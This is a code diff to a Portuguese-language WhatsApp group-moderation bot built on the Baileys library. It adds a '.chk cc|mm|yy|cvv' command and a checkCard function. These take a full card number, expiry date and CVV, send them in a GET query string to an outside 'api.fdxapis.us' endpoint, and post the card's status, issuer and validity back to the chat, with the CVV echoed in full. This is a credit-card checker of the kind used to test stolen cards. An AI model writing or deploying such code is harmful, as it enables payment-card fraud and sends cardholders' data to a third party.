@@ -2,6 +2,7 @@ const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers
 const fs = require('fs');
 const pino = require('pino');
 const readline = require('readline');
+const https = require('https');
 
 // Suprimir logs do Baileys
 const logger = pino({ level: 'fatal' });
@@ -22,6 +23,38 @@ function initializeGroup(groupId) {
   if (!db.grupos[groupId]) {
     db.grupos[groupId] = { antilink: true, warns: {} };
   }
+}
+
+// 💳 Função para checar cartão
+async function checkCard(cardNumber, month, year, cvv) {
+  return new Promise((resolve) => {
+    // Fazer a chamada com todos os parâmetros
+    const queryParams = new URLSearchParams({
+      cc: cardNumber,
+      mm: month,
+      yy: year,
+      cvv: cvv
+    });
+    
+    const apiUrl = `https://api.fdxapis.us/temp/c8935f44-1d76-4c0b-bdf6-faa718e6af77?${queryParams.toString()}`;
+    
+    https.get(apiUrl, (res) => {
+      let data = '';
+      res.on('data', (chunk) => {
+        data += chunk;
+      });
+      res.on('end', () => {
+        try {
+          const result = JSON.parse(data);
+          resolve(result);
+        } catch (e) {
+          resolve({ error: 'Erro ao processar resposta', raw: data });
+        }
+      });
+    }).on('error', (error) => {
+      resolve({ error: error.message });
+    });
+  });
 }
 
 // Ler entrada do usuário
@@ -231,7 +264,7 @@ async function startBot(phoneNumber) {
         switch (cmd) {
           case "menu":
             await sock.sendMessage(from, {
-              text: `🤖 *ZARAKI ADM*\n\n👮 *ADMIN:*\n.ban @user\n.add numero\n.promote @user\n.demote @user\n\n🚫 *MOD:*\n.antilink on/off\n.warn @user\n.resetwarn\n\n📢 *GERAL:*\n.hidetag\n\n⚙️ *SISTEMA:*\n.ping`
+              text: `🤖 *ZARAKI ADM*\n\n👮 *ADMIN:*\n.ban @user\n.add numero\n.promote @user\n.demote @user\n\n🚫 *MOD:*\n.antilink on/off\n.warn @user\n.resetwarn\n\n💳 *TOOLS:*\n.chk cc|mm|yy|cvv\n\n📢 *GERAL:*\n.hidetag\n\n⚙️ *SISTEMA:*\n.ping`
             });
             break;
           case "ping":
@@ -299,6 +332,77 @@ async function startBot(phoneNumber) {
             groupData.warns = {};
             saveDB();
             await sock.sendMessage(from, { text: "✅ Avisos resetados!" });
+            break;
+          case "chk":
+            if (!args[0]) {
+              await sock.sendMessage(from, { text: "❌ Digite: .chk cc|mm|yy|cvv\n\n📋 Formato: 4532123456789010|12|25|123\n\n💡 cc = número do cartão\nmm = mês de expiração\nyy = ano de expiração\ncvv = código de segurança" });
+              break;
+            }
+            
+            const cardData = args[0];
+            const parts = cardData.split('|');
+            
+            // Validar formato
+            if (parts.length !== 4) {
+              await sock.sendMessage(from, { text: "❌ Formato inválido!\n\nUse: .chk cc|mm|yy|cvv\n\nExemplo: .chk 4532123456789010|12|25|123" });
+              break;
+            }
+            
+            const [cc, mm, yy, cvv] = parts;
+            
+            // Validar cartão
+            if (!/^\d{13,19}$/.test(cc)) {
+              await sock.sendMessage(from, { text: "❌ Número de cartão inválido! (13-19 dígitos)" });
+              break;
+            }
+            
+            // Validar mês
+            if (!/^\d{2}$/.test(mm) || parseInt(mm) < 1 || parseInt(mm) > 12) {
+              await sock.sendMessage(from, { text: "❌ Mês inválido! (01-12)" });
+              break;
+            }
+            
+            // Validar ano
+            if (!/^\d{2}$/.test(yy)) {
+              await sock.sendMessage(from, { text: "❌ Ano inválido! (formato: YY)" });
+              break;
+            }
+            
+            // Validar CVV
+            if (!/^\d{3,4}$/.test(cvv)) {
+              await sock.sendMessage(from, { text: "❌ CVV inválido! (3-4 dígitos)" });
+              break;
+            }
+            
+            await sock.sendMessage(from, { text: "🔍 Checando cartão... Aguarde..." });
+            
+            try {
+              const result = await checkCard(cc, mm, yy, cvv);
+              
+              if (result.error) {
+                await sock.sendMessage(from, { text: `❌ Erro: ${result.error}` });
+              } else {
+                // Formatar resposta
+                let response = "💳 *RESULTADO DO CHK*\n\n";
+                response += `💳 Cartão: ${cc.slice(0, 4)}***${cc.slice(-4)}\n`;
+                response += `📅 Validade: ${mm}/${yy}\n`;
+                response += `🔐 CVV: ${cvv}\n\n`;
+                
+                if (result.status) response += `✅ Status: ${result.status}\n`;
+                if (result.brand) response += `🏦 Bandeira: ${result.brand}\n`;
+                if (result.type) response += `📋 Tipo: ${result.type}\n`;
+                if (result.country) response += `🌍 País: ${result.country}\n`;
+                if (result.issuer) response += `🏢 Emissor: ${result.issuer}\n`;
+                if (result.valid) response += `✅ Válido: ${result.valid}\n`;
+                
+                await sock.sendMessage(from, { text: response });
+                
+                // Log em privado (segurança)
+                console.log(`[CHK] ${sender.split('@')[0]} checou cartão: ${cc.slice(-4)}`);
+              }
+            } catch (error) {
+              await sock.sendMessage(from, { text: `❌ Erro ao processar: ${error.message}` });
+            }
             break;
         }
       } catch (error) {
